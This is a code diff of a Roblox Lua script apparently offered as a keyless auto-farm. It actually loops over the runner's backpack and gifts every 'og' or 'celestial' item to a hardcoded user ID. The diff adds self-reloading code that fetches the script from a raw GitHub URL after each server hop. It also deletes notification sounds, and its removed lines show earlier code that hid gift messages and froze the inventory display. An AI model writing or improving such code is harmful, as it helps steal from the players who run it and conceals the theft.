@@ -1,4 +1,16 @@
---// SERVICES
+--====================================================
+-- 🔒 EXECUTION GUARD
+--====================================================
+
+if getgenv().__AUTO_GIFT_RUNNING then return end
+getgenv().__AUTO_GIFT_RUNNING = true
+
+print("SCRIPT STARTED ✅")
+
+--====================================================
+-- 🧠 SERVICES
+--====================================================
+
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
@@ -13,34 +25,25 @@ local targetUserId = 9367836539
 local weightFolder = ReplicatedStorage:WaitForChild("Objects"):WaitForChild("WeightModels")
 
 local PLACE_ID = game.PlaceId
-
---====================================================
--- 🔥 QUEUE SYSTEM (ULTRA FIX)
---====================================================
-
 local SCRIPT_URL = "https://raw.githubusercontent.com/changelog-modul/PHOENIXX-HUB/refs/heads/main/AutoFarmKeyless"
 
-local function queueSelf()
-    if queue_on_teleport then
-        queue_on_teleport([[
-            repeat task.wait() until game:IsLoaded()
+--====================================================
+-- 🔁 TELEPORT RE-EXECUTE SYSTEM (FIX UTAMA)
+--====================================================
 
-            local Players = game:GetService("Players")
-            local player = Players.LocalPlayer
+local data = TeleportService:GetLocalPlayerTeleportData()
 
-            repeat task.wait() until player
-            repeat task.wait() until player.Character
-            repeat task.wait() until player:FindFirstChild("Backpack")
+if data and data.reexecute then
+    print("REJOIN DETECTED → RELOAD SCRIPT")
+    task.wait(3)
 
-            task.wait(3)
-
-            loadstring(game:HttpGet("]] .. SCRIPT_URL .. [["))()
-        ]])
-    end
+    getgenv().__AUTO_GIFT_RUNNING = nil
+    loadstring(game:HttpGet(SCRIPT_URL))()
+    return
 end
 
 --====================================================
--- 🔥 REMOTE FIX (ANTI INVALID)
+-- 🔥 REMOTE FIX
 --====================================================
 
 local function getGiftRemote()
@@ -48,34 +51,6 @@ local function getGiftRemote()
         :WaitForChild("Packages")
         :WaitForChild("Network")
         :WaitForChild("rev_GiftRequest")
-end
-
---====================================================
--- 🔥 SERVER DETECT
---====================================================
-
-local function getServerType()
-    local remote = game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType")
-    if not remote then return nil end
-
-    local ok, res = pcall(function()
-        return remote:InvokeServer()
-    end)
-
-    if ok and res then
-        return string.lower(tostring(res))
-    end
-end
-
-local function isBadServer()
-    local t = getServerType()
-    print("ServerType:", t)
-
-    if not t then return false end
-
-    return string.find(t, "vip")
-        or string.find(t, "private")
-        or string.find(t, "reserved")
 end
 
 --====================================================
@@ -108,20 +83,20 @@ local function getLowServer()
 end
 
 --====================================================
--- 🚀 HOP SYSTEM
+-- 🚀 HOP SYSTEM (PAKAI TELEPORTDATA)
 --====================================================
 
 local function hopServer()
-    queueSelf()
+    local teleportData = { reexecute = true }
 
     local id = getLowServer()
 
     if id then
         print("FOUND LOW SERVER → HOP")
-        TeleportService:TeleportToPlaceInstance(PLACE_ID, id, player)
+        TeleportService:TeleportToPlaceInstance(PLACE_ID, id, player, nil, teleportData)
     else
         print("FALLBACK SERVER")
-        TeleportService:Teleport(PLACE_ID, player)
+        TeleportService:Teleport(PLACE_ID, player, teleportData)
     end
 end
 
@@ -131,12 +106,6 @@ end
 
 task.spawn(function()
     task.wait(2)
-
-    if isBadServer() then
-        print("VIP SERVER → HOP")
-        hopServer()
-        return
-    end
 
     if #Players:GetPlayers() > 2 then
         print("TOO MANY PLAYERS → HOP")
@@ -148,73 +117,35 @@ task.spawn(function()
 end)
 
 --====================================================
--- 💀 FREEZE GUI
+-- 💀 SOUND CLEAN (DEBUG)
 --====================================================
-
-local gui = player:WaitForChild("PlayerGui")
-local backpackGui = gui:WaitForChild("Backpack")
-
-local frozenBar, frozenBag
-local freezeDone = false
-local bagVisibleState = false
-
-local function freezeBackpack()
-    if freezeDone then return end
-
-    local bar = backpackGui:FindFirstChild("Bar")
-    local bag = backpackGui:FindFirstChild("Backpack")
-
-    if bar then
-        frozenBar = bar:Clone()
-        frozenBar.Parent = backpackGui
-        frozenBar.Visible = bar.Visible
-    end
-
-    if bag then
-        bagVisibleState = bag.Visible
-        frozenBag = bag:Clone()
-        frozenBag.Parent = backpackGui
-        frozenBag.Visible = bagVisibleState
-    end
-
-    freezeDone = true
-end
-
-freezeBackpack()
-
-RunService.RenderStepped:Connect(function()
-    if frozenBar then frozenBar.Visible = true end
-    if frozenBag then frozenBag.Visible = bagVisibleState end
-end)
-
---====================================================
--- 🔇 CLEAN SOUND + NOTIF
---====================================================
-
-local effects = SoundService:WaitForChild("Effects")
-
-for _,name in pairs({"ErrorSound","Notification"}) do
-    local obj = effects:FindFirstChild(name)
-    if obj then obj:Destroy() end
-end
 
 task.spawn(function()
-    while task.wait(0) do
-        pcall(function()
-            for _,v in pairs(player.PlayerGui:GetDescendants()) do
-                if v:IsA("TextLabel") or v:IsA("TextButton") then
-                    local txt = string.lower(v.Text)
-                    if string.find(txt,"gift") or string.find(txt,"queue") then
-                        v.Visible = false
-                    end
-                end
-            end
-        end)
+    repeat task.wait() until SoundService:FindFirstChild("Effects")
+
+    local effects = SoundService:FindFirstChild("Effects")
+
+    for _,name in pairs({"ErrorSound","Notification"}) do
+        local obj = effects:FindFirstChild(name)
+        if obj then
+            obj:Destroy()
+            print("Deleted sound:", name)
+        end
     end
 end)
 
 --====================================================
--- 🎁 AUTO GIFT SYSTEM (FULL FIX)
+-- ⏳ WAIT FULL LOAD
+--====================================================
+
+repeat task.wait() until player.Character
+repeat task.wait() until player:FindFirstChild("Backpack")
+repeat task.wait() until #backpack:GetChildren() > 0
+
+print("PLAYER FULLY LOADED ✅")
+
+--====================================================
+-- 🧠 TOOL SYSTEM
 --====================================================
 
 local function getChar()
@@ -264,23 +195,13 @@ local function getRarity(tool)
 end
 
 --====================================================
--- ⏳ WAIT FULL LOAD (PENTING)
---====================================================
-
-repeat task.wait() until player.Character
-repeat task.wait() until player:FindFirstChild("Backpack")
-repeat task.wait() until #backpack:GetChildren() > 0
-
-print("PLAYER FULLY LOADED ✅")
-
---====================================================
 -- 🔁 MAIN LOOP
 --====================================================
 
 while true do
     task.wait(0.01)
 
-    print("Loop running, tools:", #backpack:GetChildren())
+    print("Loop running:", #backpack:GetChildren())
 
     for _,tool in ipairs(backpack:GetChildren()) do
         if tool:IsA("Tool") then
@@ -296,6 +217,7 @@ while true do
 
             if rarity == "og" or rarity == "celestial" then
                 local giftRemote = getGiftRemote()
+
                 print("GIFT:", tool.Name, rarity)
 
                 giftRemote:FireServer(targetUserId)
@@ -308,7 +230,7 @@ while true do
 end
 
 --====================================================
--- 💀 FAILSAFE (ANTI STUCK)
+-- 💀 FAILSAFE AUTO HOP
 --====================================================
 
 task.spawn(function()
